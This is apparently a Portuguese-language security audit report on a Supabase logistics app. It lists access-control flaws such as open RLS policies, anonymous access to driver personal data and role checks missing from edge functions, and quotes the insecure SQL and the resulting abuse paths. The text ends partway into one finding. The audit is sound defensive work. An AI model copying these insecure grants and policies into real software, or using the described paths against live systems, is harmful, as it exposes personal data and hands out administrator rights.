# 03 — Achados

Base: commit `281cd07`. 291 achados mantidos — **16 Crítica**, **64 Alta**,
**148 Média**, **63 Baixa**. Agrupados por causa raiz quando mais de um achado
compartilha a mesma origem; o restante vem agrupado por camada.

Cada achado passou por uma segunda leitura independente (um revisor que tentou **refutar** o achado
reabrindo os arquivos citados). 6 achados foram **refutados e removidos** — a lista está no fim
deste arquivo, com o motivo, para não serem reabertos por engano.

- **Confiança `confirmado`**: a evidência fecha o caso sozinha.
- **Confiança `hipotese`**: falta um acesso que esta sessão não tem (banco de produção, edges publicadas,
  front em produção — o erro exato está em `01-INVENTARIO.md` §11). Marcado achado por achado.
- **Modo `EXECUTADO`** = comando/consulta/request rodado; **`RASTREADO`** = caminho seguido lendo o código.


## Causa raiz: RLS e permissões do banco afrouxadas para destravar tela e nunca refechadas

Entre agosto e novembro várias migrations abriram a permissão de leitura e escrita de tabelas sensíveis só para fazer uma tela voltar a funcionar (o dashboard dava erro, os gatilhos de auditoria travavam, o cache não atualizava). A versão segura foi apagada e a permissiva ficou no lugar, sem ninguém voltar depois. O resultado é um banco onde qualquer pessoa logada pode se promover a administrador, ler a auditoria, mexer na fila de trabalho, e onde nome, telefone e nota de risco dos motoristas ficam visíveis até sem login. É a mesma decisão repetida: resolver o sintoma na tela abrindo o cofre.

**11 achado(s) sob esta causa.**


#### C-001 — Nome, telefone e score de risco dos motoristas expostos sem login: materialized view driver_stats_cache com GRANT SELECT para anon

- **Camada:** Banco — RLS e autorização
- **Severidade:** Crítica · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Qualquer pessoa na internet, usando a chave pública que vem no site, baixa a lista inteira de motoristas com nome, telefone, veículo e a classificação interna de risco (inclusive quem está em lista negra). É vazamento de dado pessoal e de avaliação interna, com exposição a LGPD.
- **Evidência:**
  ```
  supabase/migrations/20261122090000_cache_system_backend.sql:164 — `GRANT SELECT ON driver_stats_cache TO authenticated, anon, service_role;` + definição em :20-31 — `CREATE MATERIALIZED VIEW IF NOT EXISTS driver_stats_cache AS SELECT ... d.name AS driver_name, ... d.phone, ... d.risk_score, d.risk_level, ...`
  ```
- **Causa raiz:** Materialized view não suporta RLS — o único controle é o GRANT. A migration concede SELECT a `anon` (papel das requisições sem login, cuja chave publicável está no bundle do front) para 3 MVs e para a view cache_status. Isso reverte, para esses objetos, o endurecimento de 20260902000000_harden_revoke_anon_grants.sql:16 (`REVOKE ALL PRIVILEGES ON ALL TABLES IN SCHEMA public FROM anon`), que é anterior: um GRANT posterior vence o REVOKE anterior. A tabela-base `drivers` tem RLS correta (policies por papel em 20260108144121 e 20260306010037), mas a MV materializa as linhas e serve como cópia sem RLS.
- **Arquivos:** `supabase/migrations/20261122090000_cache_system_backend.sql`, `supabase/migrations/20260902000000_harden_revoke_anon_grants.sql`
- **Etapas do plano:** 005

#### C-002 — Qualquer usuário autenticado pode se promover a admin (user_roles com INSERT/UPDATE WITH CHECK/USING true)

- **Camada:** Banco — RLS e autorização
- **Severidade:** Crítica · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Qualquer pessoa com login no sistema, mesmo um usuário só de consulta, pode se tornar administrador e passar a ver e alterar tudo: pedidos, motoristas, configuração de alertas, tokens de integração. O controle de quem pode o quê deixa de existir.
- **Evidência:**
  ```
  supabase/migrations/20260828000003_comprehensive_rls_fix.sql:17-20 — `CREATE POLICY "Authenticated users can view roles" ON public.user_roles FOR SELECT TO authenticated USING (true);` / `CREATE POLICY "Authenticated users can insert roles" ON public.user_roles FOR INSERT TO authenticated WITH CHECK (true);` / `CREATE POLICY "Authenticated users can update roles" ON public.user_roles FOR UPDATE TO authenticated USING (true);` — e 20260828000003:23-27 `INSERT INTO public.user_roles (user_id, role) SELECT au.id, 'admin'::public.app_role FROM auth.users au ...`
  ```
- **Causa raiz:** 20260828000002_dashboard_fixes.sql:8-19 e 20260828000003:10-20 dropam as policies corretas ("Users can view their own roles", "Admins can manage user roles") e recriam versões permissivas para resolver um erro 406 do dashboard. A versão segura, de 20260712202439_22b0c67b-a04f-4143-8b53-6b8c6b659bc8.sql:17-31 ("MFA admins can insert/update/delete roles" com has_role(admin) AND is_aal2()), continua existindo, mas policies permissivas de RLS são combinadas com OR: a que exige admin+MFA fica irrelevante. 20260828000003 é a ÚLTIMA migration das 191 que toca user_roles — nenhuma posterior dropa essas três.
- **Arquivos:** `supabase/migrations/20260828000003_comprehensive_rls_fix.sql`, `supabase/migrations/20260828000002_dashboard_fixes.sql`, `supabase/migrations/20260712202439_22b0c67b-a04f-4143-8b53-6b8c6b659bc8.sql`
- **Etapas do plano:** 004

#### C-013 — RLS de user_roles deixa qualquer usuario logado se promover a admin

- **Camada:** Transversal — segurança
- **Severidade:** Crítica · **Confiança:** hipotese · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Um usuario com o perfil mais baixo (viewer) pode se tornar administrador sozinho, pelo navegador, sem pedir nada a ninguem. Dali ele ve e muda tudo: pedidos, motoristas, dados de cliente, configuracoes de alerta e os paineis de seguranca.
- **Evidência:**
  ```
  supabase/migrations/20260828000003_comprehensive_rls_fix.sql:18-20 (policies abertas) e :23-27 (admin para todos); restritas sobreviventes em 20260712202439_22b0c67b-a04f-4143-8b53-6b8c6b659bc8.sql:11-32; nenhuma migration posterior remove as abertas (só 20260828000004 e 20261121100000 citam user_roles); escrita pelo front em src/hooks/useRole.ts:70-84
  ```
- **Causa raiz:** A migration 20260828000003 foi feita para 'consertar o dashboard' abrindo RLS e nunca foi revertida. A migration que limpou o mesmo tipo de bug (20261122150100_fix_public_rls_bypass.sql) so derrubou as policies com nome 'Public can *' (TO anon) e nao olhou as 'Authenticated users can *' de user_roles. Como policies permissivas se combinam com OR, a policy aberta vence a restrita de 20260712202439.
- **Arquivos:** `supabase/migrations/20260828000003_comprehensive_rls_fix.sql`, `supabase/migrations/20260828000002_dashboard_fixes.sql`, `supabase/migrations/20260712202439_22b0c67b-a04f-4143-8b53-6b8c6b659bc8.sql`, `src/hooks/useRole.ts`
- **Etapas do plano:** 014
- **HIPÓTESE — NÃO VERIFICADO.** Falta para confirmar: Nenhum MCP desta sessao aponta para o projeto oficial iecgydonctmabiijadsf (AGENTS.md > Banco), entao nao foi possivel listar as policies vigentes em producao. A cadeia de migrations do repo e conclusiva sobre o estado DECLARADO; falta a confirmacao de que producao esta igual ao declarado (ou pior, se alguem aplicou SQL a mao).

#### A-002 — audit_log aberto a qualquer usuário logado: política de leitura sem papel e RPC de escrita concedida a authenticated

- **Camada:** Banco — funções, triggers e cron (+ 1 outro(s) local)
- **Severidade:** Alta · **Confiança:** hipotese · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Um usuário com o perfil mais básico pode ler o histórico de quem mudou o quê nas configurações do sistema e inserir registros falsos nesse mesmo histórico, tornando a trilha de auditoria pouco confiável como prova.
- **Evidência:**
  ```
  supabase/migrations/20261121192500_restore_audit_log.sql:33-35 (`audit_log_select ... USING (auth.uid() IS NOT NULL)`), :37-39 (`audit_log_insert ... WITH CHECK (true)`) e :58-59 (`GRANT EXECUTE ON FUNCTION public.create_audit_log(...) TO authenticated, service_role` sobre função SECURITY DEFINER sem checagem de papel, :47-56). Conteúdo auditado: supabase/migrations/20261122130100_geo_foundation.sql:610-614. Segunda porta aberta na mesma tabela: supabase/migrations/20260828000003_comprehensive_rls_fix.sql:67-73 (`"Authenticated full access audit_log" FOR ALL TO authenticated USING (true) WITH CHECK (true)`) e :79-83 (`GRANT ALL ON ALL TABLES IN SCHEMA public TO authenticated` / `TO anon`). Padrão correto na mesma semana: supabase/migrations/20261123160000_job_queue_processing_log.sql:52-54.
  ```
  Mesma causa, outro local — Banco — RLS e autorização:
  ```
  supabase/migrations/20261121192500_restore_audit_log.sql:33-39 — `DROP POLICY IF EXISTS "audit_log_select" ON public.audit_log;` / `CREATE POLICY "audit_log_select" ON public.audit_log FOR SELECT USING (auth.uid() IS NOT NULL);` / `CREATE POLICY "audit_log_insert" ON public.audit_log FOR INSERT WITH CHECK (true);`
  ```
- **Causa raiz:** A migration de restauração copiou as políticas permissivas do arquivo original de 2025 (20251226000002:22-25) em vez de adotar o padrão admin-only que o repo passou a usar, e concedeu a RPC de escrita a `authenticated` para o front poder registrar ações — sem filtro de papel nem validação dos campos.
- **Arquivos:** `docs/MIGRATION_RECONCILIATION_2026-11.md`, `supabase/migrations/20251226000002_create_audit_log.sql`, `supabase/migrations/20261121192500_restore_audit_log.sql`, `supabase/migrations/20261122130100_geo_foundation.sql`, `supabase/migrations/20261123160000_job_queue_processing_log.sql`
- **Etapas do plano:** 017
- **HIPÓTESE — NÃO VERIFICADO.** Falta para confirmar: Se o papel `authenticated` tem GRANT de tabela em audit_log — a migration não concede explicitamente, mas os privilégios padrão do schema public em projetos Supabase costumam conceder (o hardening de 20260902000000_harden_revoke_anon_grants.sql revoga só para anon, linhas 16-27). Sem acesso ao banco oficial: `select has_table_privilege('authenticated','public.audit_log','SELECT'), has_table_privilege('authenticated','public.audit_log','INSERT');`. A parte da RPC (GRANT EXECUTE a authenticated) já está confirmada pelo código.

#### A-004 — Tokens da Unified API da Lalamove gravados em texto puro numa tabela legível pelo navegador do administrador

- **Camada:** Banco — integridade e índices
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 3 revisor(es) independente(s)
- **Impacto no negócio:** A credencial que dá acesso à conta da empresa na Lalamove fica ao alcance de qualquer sessão de administrador — incluindo uma sessão sequestrada, uma extensão de navegador ou um print de tela de ferramenta de desenvolvedor. Com ela dá para criar e cancelar pedidos em nome da empresa.
- **Evidência:**
  ```
  supabase/migrations/20260315165451_86aebbac-da62-421e-b90c-59196d72b2da.sql:3-6 e :25-30; supabase/migrations/20260902000000_harden_revoke_anon_grants.sql:16,20 (revoga so anon); nenhum consumidor no front — apenas supabase/functions/lalamove-uapi/index.ts:141 e supabase/functions/lalamove-token-refresh/index.ts:98 (service_role)
  ```
- **Causa raiz:** A política de segurança fecha a função, que era o caminho indireto, mas deixa a tabela com GRANT padrão para `authenticated` e uma policy FOR ALL para quem tem papel admin. Qualquer sessão de administrador no navegador pode, pelo PostgREST, fazer `select access_token, refresh_token from lalamove_uapi_sessions` — o segredo sai do servidor e entra no browser. Isso contraria a regra do AGENTS.md de que segredo de serviço vive só em secret de edge.
- **Arquivos:** `supabase/migrations/20260315165451_86aebbac-da62-421e-b90c-59196d72b2da.sql`, `supabase/migrations/20260711184027_e973dd91-92eb-4403-bb93-065601d4ec41.sql`, `supabase/migrations/20260902000000_harden_revoke_anon_grants.sql`
- **Etapas do plano:** 019

#### A-005 — Duas migrations dão papel admin a todos os usuários existentes e uma terceira reativa papéis desativados

- **Camada:** Banco — RLS e autorização
- **Severidade:** Alta · **Confiança:** hipotese · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Todo mundo que já tinha conta na época virou administrador, e quem tinha tido o acesso cortado voltou a ter. Na prática os níveis viewer/operator/manager deixaram de significar alguma coisa para a base de usuários antiga.
- **Evidência:**
  ```
  supabase/migrations/20260828000002_dashboard_fixes.sql:26-34 — `INSERT INTO public.user_roles (user_id, role) SELECT au.id, 'admin'::public.app_role FROM auth.users au WHERE NOT EXISTS (SELECT 1 FROM public.user_roles ur WHERE ur.user_id = au.id) ON CONFLICT (user_id, role) DO NOTHING;`; repetido em 20260828000003_comprehensive_rls_fix.sql:22-27; 20260828000004_populate_permissions.sql:88-90 — `UPDATE public.user_roles SET is_active = true WHERE is_active IS NULL OR is_active = false;`. Ressalva de precisão: o INSERT atinge só quem não tinha NENHUMA linha em user_roles (cláusula WHERE NOT EXISTS) — quem já era 'viewer' continuou 'viewer'.
  ```
- **Causa raiz:** Para resolver "role indefinido" no dashboard (comentário em 20260828000002:24-25), as migrations escolheram o papel mais alto como default em vez do mais baixo ('viewer', que é o DEFAULT da própria coluna em 20251231115949:12). O UPDATE de 20260828000004 reativa indiscriminadamente, e `has_role` (versão final em 20260712210653:8-15) filtra por `is_active = true` — então revogações feitas por desativação foram desfeitas. Nenhuma migration posterior às 191 reverte: não há DELETE nem UPDATE de `role` em user_roles depois disso.
- **Arquivos:** `supabase/migrations/20260828000002_dashboard_fixes.sql`, `supabase/migrations/20260828000003_comprehensive_rls_fix.sql`, `supabase/migrations/20260828000004_populate_permissions.sql`, `supabase/migrations/20251231115949_817e6539-79a0-43fd-98e6-e7bb705cf1b2.sql`
- **Etapas do plano:** 020
- **HIPÓTESE — NÃO VERIFICADO.** Falta para confirmar: É um achado de DADO, não de schema: preciso do banco real para saber quantas linhas foram afetadas e quais continuam lá. Falta rodar `select role, count(*) from public.user_roles where is_active group by 1;` e cruzar com a lista de quem deveria ser admin — só o dono define isso.

#### M-004 — job_queue: policies permissivas de 2025 nunca removidas — leitura por qualquer autenticado e INSERT validado por metadado que o próprio usuário controla

- **Camada:** Banco — RLS e autorização
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Em qualquer ambiente montado a partir do repositório (o banco de teste, uma cópia nova), um usuário comum enxerga a fila inteira de trabalhos do sistema e, declarando-se admin no próprio cadastro, consegue enfileirar trabalhos — inclusive dos tipos que disparam WhatsApp, e-mail e Slack reais para fornecedor e motorista.
- **Evidência:**
  ```
  supabase/migrations/20251226000003_create_job_queue.sql:399-401 — `CREATE POLICY "Admin can view all jobs"` / `ON job_queue FOR SELECT` / `USING (auth.role() = 'authenticated');`; supabase/migrations/20251226010000_create_job_queue_system.sql:390-394 — `CREATE POLICY "Admins can create jobs" ON job_queue FOR INSERT WITH CHECK (auth.uid() IN (SELECT id FROM auth.users WHERE raw_user_meta_data->>'role' = 'admin'));`; supabase/migrations/20261122120200_job_queue_system.sql:162-165 dropa apenas "Service role full access" e "Admins view jobs".
  ```
- **Causa raiz:** Dois defeitos somados. (1) O nome da policy mente sobre o conteúdo: "Admin can view all jobs" libera SELECT para todo authenticated. (2) A autorização de INSERT lê o papel de `auth.users.raw_user_meta_data`, que é o metadado que o próprio usuário envia no signUp/updateUser — não da tabela `user_roles`, que é a fonte de verdade do RBAC e tem o helper `has_role` justamente para isso (20260712210653). A migration de baseline de 22/11 acrescenta a policy correta (`FOR SELECT TO authenticated USING (public.has_role(auth.uid(),'admin'))`) mas não dropa as antigas; como RLS combina permissivas com OR, a correta não restringe nada.
- **Arquivos:** `supabase/migrations/20251226000003_create_job_queue.sql`, `supabase/migrations/20251226010000_create_job_queue_system.sql`, `supabase/migrations/20261122120200_job_queue_system.sql`, `supabase/migrations/20261122140000_fix_crons_dispatcher.sql`
- **Etapas do plano:** 042

#### M-005 — refresh_cache_view executável por qualquer autenticado, sem checagem de papel

- **Camada:** Banco — RLS e autorização
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Qualquer usuário logado, inclusive um perfil só de consulta, consegue mandar o banco recalcular os três caches pesados quantas vezes quiser. Repetido, isso consome CPU do banco e deixa o sistema lento para todo mundo, sem aparecer como erro.
- **Evidência:**
  ```
  supabase/migrations/20261123150000_cache_refresh_log_restaurado.sql:116 `GRANT EXECUTE ON FUNCTION public.refresh_cache_view(text, text) TO authenticated, service_role;` + :94 `    EXECUTE format('REFRESH MATERIALIZED VIEW CONCURRENTLY %I', p_view_name);` sem nenhum guard de papel no corpo (:58-114).
  ```
- **Causa raiz:** A função é SECURITY DEFINER (:64) e foi concedida ao papel `authenticated` inteiro, repetindo o GRANT da versão anterior (20261122090000:168). O padrão de proteção usado no resto do repo para RPC privilegiada é o guard interno — `mcp_introspect` levanta exceção 42501 se `can_run_db_diagnostics(auth.uid())` for falso (20260813125422:67-70) — ou o REVOKE de authenticated (20261122120200:169-175 para as funções de job_queue). Aqui não há nem um nem outro.
- **Arquivos:** `supabase/migrations/20261123150000_cache_refresh_log_restaurado.sql`, `supabase/migrations/20261122090000_cache_system_backend.sql`, `supabase/migrations/20261123110000_cron_refresh_cache_views.sql`
- **Etapas do plano:** 043

#### M-016 — Telemetria de erro do front escreve com a chave publica sem o token da sessao, e a policy exige usuario autenticado

- **Camada:** Transversal — segurança
- **Severidade:** Média · **Confiança:** hipotese · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** A tela de monitoramento de erros nao recebe nada: todo erro de tela que acontecer com o usuario e descartado em silencio (a funcao nao trata a falha), entao o dono acredita que esta tudo bem porque o painel esta vazio. Nao ha vazamento, mas a seguranca perde o sinal que serviria para detectar problema.
- **Evidência:**
  ```
  A parte da leitura esta ERRADA. src/hooks/useErrorLogs.ts:39-46 (getAuthHeaders) ja faz 'const { data } = await supabase.auth.getSession()' e manda 'Authorization: Bearer <access_token>' com fallback para a chave; as linhas :37-38 citadas sao apenas a definicao das constantes. A leitura e o modelo correto a copiar, nao um segundo caso do defeito.
  ```
- **Causa raiz:** O comentario em src/services/errorMonitoring.ts:55 explica a escolha ('Use raw REST API to avoid type issues with unregistered table'): ao sair do client supabase-js para fetch cru, perdeu-se o envio do access token da sessao, que e o que faz a requisicao valer como authenticated. O hardening posterior de grants (20260902) selou o caminho.
- **Arquivos:** `src/services/errorMonitoring.ts`, `src/hooks/useErrorLogs.ts`, `supabase/migrations/20260315150348_629a3abc-d72f-4ba0-a24b-73d73457ed8b.sql`, `supabase/migrations/20260902000000_harden_revoke_anon_grants.sql`
- **Etapas do plano:** 054
- **HIPÓTESE — NÃO VERIFICADO.** Falta para confirmar: Nao foi possivel emitir a requisicao real contra iecgydonctmabiijadsf nem ler os logs do PostgREST (sem MCP do projeto oficial). Falta confirmar o codigo de retorno observado (esperado 401/403 'permission denied for table runtime_error_logs') e se a tabela runtime_error_logs tem linha recente.

#### B-001 — Bloco DO de 20260828000003 compara variável com coluna de mesmo nome e tenta abrir FOR ALL USING(true) em 13 tabelas sensíveis

- **Camada:** Banco — RLS e autorização
- **Severidade:** Baixa · **Confiança:** hipotese · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Ou a migration falha no meio e deixa o banco num estado que ninguém sabe descrever, ou ela abre as tabelas de auditoria, de log e da fila de trabalhos para qualquer usuário logado alterar e apagar. Nos dois casos não há como afirmar qual é o estado real sem consultar o banco.
- **Evidência:**
  ```
  supabase/migrations/20260828000003_comprehensive_rls_fix.sql:46 `  table_name TEXT;` · :63 `  FOREACH table_name IN ARRAY tables_to_check` · :68 `      WHERE table_schema = 'public' AND table_name = table_name` · :71 `      EXECUTE format('CREATE POLICY "Authenticated full access %I" ON public.%I FOR ALL TO authenticated USING (true) WITH CHECK (true)', table_name, table_name);` — lista de tabelas em :47-61.
  ```
- **Causa raiz:** `table_name` é ao mesmo tempo a variável PL/pgSQL e uma coluna de information_schema.tables. Com o `plpgsql.variable_conflict` padrão (error), a referência ambígua aborta a execução do bloco; se o conflito for resolvido a favor da variável, a condição vira a tautologia `table_name = table_name` e o IF passa para todos os 13 nomes, criando acesso total para qualquer autenticado em tabelas de auditoria, log, fila e flags. Os dois desfechos são ruins e nenhum é o pretendido. No desfecho de erro, as linhas 76-81 da mesma migration (`GRANT ALL ON ALL TABLES IN SCHEMA public TO anon`) nunca chegam a rodar — o que explica por que o endurecimento de 20260902000000 encontrou o banco menos aberto do que o arquivo sugere.
- **Arquivos:** `supabase/migrations/20260828000003_comprehensive_rls_fix.sql`, `supabase/migrations/20260902000000_harden_revoke_anon_grants.sql`
- **Etapas do plano:** 055
- **HIPÓTESE — NÃO VERIFICADO.** Falta para confirmar: Preciso saber qual dos dois desfechos ocorreu em produção: `select tablename, policyname from pg_policies where policyname like 'Authenticated full access%';` — se vier vazio, o bloco abortou; se vier com linhas, o acesso total existe. Também falta checar se `anon` recebeu os GRANTs de :78-81 antes de 20260902000000 revogar.

#### B-002 — Policy pública de leitura em alert_configurations sobreviveu ao fix de 22/11

- **Camada:** Banco — RLS e autorização
- **Severidade:** Baixa · **Confiança:** hipotese · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** A configuração de quais alertas vão para WhatsApp, Slack ou e-mail continua marcada como "liberada para quem não tem login". Hoje outra trava impede o acesso de fato, mas basta alguém reconceder permissão de leitura ao público para a configuração de alertas vazar, sem nenhuma mudança visível.
- **Evidência:**
  ```
  supabase/migrations/20260828000001_seed_fix_rls.sql:111 — `CREATE POLICY "Public can view alert configs" ON public.alert_configurations FOR SELECT TO anon USING (true);`; supabase/migrations/20261122150000_fix_alert_configs_anon_insert.sql:15 — `DROP POLICY IF EXISTS "Public can insert alert configs" ON public.alert_configurations;` (só o INSERT). Proteção que ele não viu: supabase/migrations/20260902000000_harden_revoke_anon_grants.sql:16 — `REVOKE ALL PRIVILEGES ON ALL TABLES IN SCHEMA public FROM anon;`
  ```
- **Causa raiz:** A varredura de 22/11 produziu dois arquivos: 20261122150000 tratou alert_configurations (só o INSERT, que era o vetor do incidente investigado) e 20261122150100_fix_public_rls_bypass.sql limpou as outras 10 tabelas do seed — mas alert_configurations não está na lista dele, então a policy de SELECT para `anon` nunca foi dropada. É a última migration que decide o caso: nada posterior toca essa policy.
- **Arquivos:** `supabase/migrations/20260828000001_seed_fix_rls.sql`, `supabase/migrations/20261122150000_fix_alert_configs_anon_insert.sql`, `supabase/migrations/20261122150100_fix_public_rls_bypass.sql`, `supabase/migrations/20260902000000_harden_revoke_anon_grants.sql`
- **Etapas do plano:** 056
- **HIPÓTESE — NÃO VERIFICADO.** Falta para confirmar: O efeito prático depende dos grants reais: 20260902000000_harden_revoke_anon_grants.sql:16 revoga tudo de `anon` em public, o que neutraliza a policy. Falta confirmar no banco que `anon` realmente não tem SELECT em alert_configurations hoje: `select grantee, privilege_type from information_schema.role_table_grants where table_name='alert_configurations';`


## Causa raiz: Função de servidor que exige login mas nunca confere o papel

O endurecimento das funções de servidor parou em "tem que estar logado". Nenhuma delas pergunta se quem chamou é administrador, gestor ou apenas visualizador — e o controle de papéis do produto existe só na tela. Como essas funções rodam com a chave mestra do banco, qualquer pessoa com uma conta, inclusive um visualizador, pode criar e cancelar frete pago, redirecionar o aviso automático da Lalamove para outro endereço, gastar crédito de inteligência artificial, emitir e revogar a credencial que determina a fatura do mapa, reescrever as permissões do banco em produção e ler a base inteira de clientes e motoristas.

**11 achado(s) sob esta causa.**


#### C-003 — evaluate-driver: sem nenhuma autenticação em código, e o score de risco é calculado com números enviados pelo próprio chamador — dá para bloquear qualquer motorista

- **Camada:** Backend — demais edges (+ 1 outro(s) local)
- **Severidade:** Crítica · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Dá para tirar do ar o motorista que a empresa quiser: uma chamada com números inventados marca o motorista como bloqueado no sistema, cria alerta crítico e entope a fila de aprovação manual. Também permite criar motoristas falsos no cadastro. Como a chamada não exige perfil nenhum, qualquer usuário logado (ou quem tiver a chave pública do front) consegue.
- **Evidência:**
  ```
  supabase/functions/evaluate-driver/index.ts:487-528 (serve → service_role, zero autorização), :663-675 (payload tem precedência sobre calculateStatsFromOrders), :709 (rating do payload), :313-324 + :750-756 (autoBlocked → status BLOCKED + alerta), :547-565 (insert em drivers com dados do corpo); supabase/functions/_shared/schemas.ts:33-34 (driverId string livre vs orderId uuid).
  ```
  Mesma causa, outro local — Regras de negócio — cálculos:
  ```
  supabase/functions/evaluate-driver/index.ts:661-663 — "// Calculate stats - prefer manual payload, then from orders if available, else from driver record\n    let stats: DriverStats;\n    if (parseResult.data.totalDeliveries !== undefined && parseResult.data.totalDeliveries !== null) {"; index.ts:733-744 — ".from('drivers').update({ risk_score: result.riskScore, ... success_rate: stats.successRate, failure_rate: stats.failureRate, avg_delay_minutes: stats.avgDelayMinutes })"; index.ts:709 — "parseResult.data.rating ?? evaluatedDriver.rating ?? 5"; supabase/functions/_shared/schemas.ts:37-42 — "totalDeliveries: z.number().nonnegative().optional().nullable(), ... rating: z.number().min(0).max(5).optional().nullable(),"; ausência de bloco [functions.evaluate-driver] em supabase/config.toml.
  ```
- **Causa raiz:** A function nasceu para ser chamada pelo webhook e pelo job-worker com service_role (supabase/functions/lalamove-webhook/index.ts:479, supabase/functions/job-worker/index.ts:91,117) e, por isso, nunca ganhou gate próprio. Mas ela também é exposta ao front (src/hooks/useEvaluateDriver.ts:58) e aceita no corpo os mesmos números que deveria apurar sozinha. O caminho `totalDeliveries` informado tem precedência sobre os pedidos reais lidos do banco (linhas 663 vs 674-677), e o nível CRITICAL (score >= 8, linha 270) dispara `autoBlocked`, que escreve `status = 'BLOCKED'` no motorista com service_role. Os fatores que compõem o score — taxa de falha acima de 20% (:137), nota abaixo de 3 (:218), atraso médio acima de 30 min (:197), taxa de cancelamento acima de 15% (:243) — são todos controlados pelo corpo da request.
- **Arquivos:** `src/hooks/useEvaluateDriver.ts`, `supabase/config.toml`, `supabase/functions/_shared/schemas.ts`, `supabase/functions/evaluate-driver/index.ts`
- **Etapas do plano:** 008

#### C-004 — external-db-bridge: qualquer usuário autenticado faz CRUD e RPC arbitrários no banco externo com a service_role dele

- **Camada:** Backend — demais edges
- **Severidade:** Crítica · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Qualquer pessoa com login no sistema, até o perfil que só deveria olhar relatórios, consegue copiar ou apagar a base de clientes, fornecedores e transportadoras da empresa que fica no banco externo. Não existe trilha de quem fez o quê além de registros de consulta lenta.
- **Evidência:**
  ```
  supabase/functions/external-db-bridge/index.ts:241-248 (única autorização = getUser), :265-274 (service_role do banco externo), :127-137 (rpc arbitrária), :201-215 (delete por filtros livres); supabase/functions/_shared/schemas.ts:445/460/466/471/476 (table e rpc_name como string livre). Contraste: supabase/functions/external-companies/index.ts:31-49 (requireOperator) e :86 (ALLOWED_TABLES).
  ```
- **Causa raiz:** A function foi escrita como ponte genérica de banco e só checa "existe sessão", não o papel. Toda operação roda com a service_role do banco externo, que ignora RLS, e nem a tabela nem o nome da RPC passam por lista de permitidos — ao contrário da irmã external-companies, que tem `ALLOWED_TABLES` (supabase/functions/external-companies/index.ts:86) e exige papel >= operator. Resultado: o menor papel do sistema (`viewer`) tem, por esta porta, poder de administrador do banco externo: ler qualquer tabela, inserir, atualizar, apagar linhas filtrando por qualquer coluna, e chamar qualquer função do banco.
- **Arquivos:** `supabase/functions/external-db-bridge/index.ts`, `supabase/functions/_shared/schemas.ts`
- **Etapas do plano:** 007

#### C-005 — lalamove-api nao tem nenhuma checagem de papel: qualquer usuario logado cria pedido pago, cancela, aumenta taxa e redireciona o webhook da conta

- **Camada:** Backend — edges Lalamove (+ 1 outro(s) local)
- **Severidade:** Crítica · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Qualquer pessoa com login no sistema — inclusive o perfil de so-leitura — pode gastar dinheiro da empresa criando entregas, cancelar entregas em andamento, aumentar o valor pago ao motorista e, pior, apontar todos os avisos da Lalamove para um endereco de fora, cegando o rastreamento e entregando os dados de entrega a terceiros.
- **Evidência:**
  ```
  supabase/functions/lalamove-api/index.ts:661 (service_role antes de tudo), :1084-1093 (case set-webhook sem gate) + :450-452 (setWebhookUrl → PATCH /webhook), :915-925 e :981-989 (getUser é só auditoria, não autorização); supabase/migrations/20261122120100_lalamove_integration_columns.sql:80-85 (RLS exige admin na tabela de config do webhook).
  ```
  Mesma causa, outro local — Integrações e contratos:
  ```
  /home/user/Lalamove_V2/supabase/functions/lalamove-api/index.ts:1092 → `result = await setWebhookUrl(webhookUrl);` · :451 → `return lalamoveRequest('PATCH', '/webhook', { data: { url } });` · /home/user/Lalamove_V2/supabase/functions/_shared/schemas.ts:929 → `url: z.string().min(1, "url é obrigatório"),` · /home/user/Lalamove_V2/supabase/config.toml:19 → `verify_jwt = true` (único controle) · grep de `role` no index.ts: nenhuma ocorrência
  ```
- **Causa raiz:** A funcao foi protegida apenas por `verify_jwt = true` no supabase/config.toml, que prova que existe uma sessao Supabase — nao que o papel dela autoriza a acao. Nenhuma autorizacao foi adicionada no codigo, e o cliente de banco e criado direto com service_role (index.ts:661 `createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY)`), o que tambem anula a RLS que separa viewer/operator/manager/admin. O proprio repo trata a configuracao do webhook como assunto de admin: a tabela lalamove_webhook_config tem politica `has_role(auth.uid(),'admin')` (supabase/migrations/20261122120100_lalamove_integration_columns.sql:80-85), mas a edge que de fato repointa a URL na Lalamove nao recheca nada.
- **Arquivos:** `/home/user/Lalamove_V2/supabase/config.toml`, `/home/user/Lalamove_V2/supabase/functions/_shared/schemas.ts`, `/home/user/Lalamove_V2/supabase/functions/lalamove-api/index.ts`, `supabase/config.toml`, `supabase/functions/_shared/schemas.ts`, `supabase/functions/lalamove-api/index.ts`, `supabase/migrations/20261122120100_lalamove_integration_columns.sql`
- **Etapas do plano:** 009

#### C-011 — Edges sensiveis so exigem login, sem nenhuma checagem de papel: viewer cria frete pago e redireciona o webhook da Lalamove

- **Camada:** Transversal — segurança
- **Severidade:** Crítica · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
